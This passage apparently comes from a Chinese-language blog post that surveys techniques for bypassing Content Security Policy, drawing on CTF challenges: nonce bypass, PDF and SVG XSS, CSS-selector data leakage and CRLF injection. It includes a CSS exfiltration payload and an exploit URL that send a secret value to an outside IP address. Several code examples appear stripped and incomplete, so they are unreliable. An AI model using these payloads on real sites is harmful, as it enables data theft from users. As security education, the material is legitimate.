利用条件:
  1. script-src只使用nonce
  2. 没有额外设置base-uri
  3. 页面引用存在相对路径的``标签
### 不完整script标签绕过nonce
考虑下下列场景，如果存在这样场景，该怎么绕过CSP
如果我们输入 `http://127.0.0.1/2.php?xss=
    123
于是我们可以输入 `http://127.0.0.1/2.php?xss=123
在CSP标准里面，有一个属性是object-src，它限制的是  标签的src，也就是插件的src  
于是我们可以通过插件来执行Javascript代码，插件的js代码并不受script-src的约束  
最常见的就是flash-xss，但是flash实在太老，而且我想在看的师傅们也很少会开浏览器的flash了，所以我这里也不说明了，这里主要讲之前一个提交asrc的pdf-xss为例  
PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本
当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等  
具体可以看看这篇文章  
里面有上面实例用的恶意pdf文件
当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件
利用条件:
  1. 没有设置object-src，或者object-src没有设置为'none'
  2. pdf用的是chrome的默认解析器
### SVG绕过
SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss
之前的easer CONFidence CTF就出过svg的xss  
引用 [https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/](https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%92%8Csvg-xss/)  
1.svg
利用条件:
  1. 可以上传svg图片
### 不完整的资源标签获取资源
看看下面的例子，我们如何把flag给带出来
    flag{0xffff}
    3
这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见  
虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的  
大概思路就是css提供了选择器，当选择器到对应元素的时，可以加载一个外域请求，相当于sql的盲注
    //这里引用的是上面文章中的exp
    input[value^="6703"] {background-image:url("http://vps_ip/?6703");}
这句话的意思是，当input的value值已6703开头，则去加载后面的url，于是我们可以一位一位爆破，先猜第一位，再猜第二位。。。
exp: `http://127.0.0.1/1.php?xss=input[value^="flag{0xffff}"]
{background-image:url("http://47.106.65.216:1002/?flag{0xffff}")}%3C/style%3E`  
太苛刻了，之前想到随便提一下好了  
利用条件:(好苛刻啊都不想写了)
  1. style允许内敛，img可以跨域
  2. 需要获取的数据在页面内
  3. 可以新建标签
  4. 可以多次发送xss且获取的数据不会变（毕竟不可能一次请求就注出来，除非能执行js写脚本一口气注）
### CRLF绕过
HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP  
原题github 
这个原理比较简单，就不写条件了
## 后话
个人总结的一些csp绕过思路，并不是很全，若有不足，敬请批评补充
## 参考链接
[https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/](https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%92%8Csvg-xss/)  
[https://blog.cal1.cn/post/RCTF 2018 rBlog
writeup](https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup)  